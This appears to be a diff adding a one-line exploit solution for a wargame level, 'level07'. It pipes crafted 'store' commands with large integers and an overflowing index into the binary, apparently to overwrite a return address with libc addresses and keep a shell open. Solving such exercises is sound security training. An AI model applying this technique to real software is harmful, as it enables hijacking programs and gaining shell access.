@@ -1,0 +1,1 @@
+(python -c 'print "store\n4160264172\n116\nstore\n4159090384\n1073741938\nquit"'; cat) | ./level07
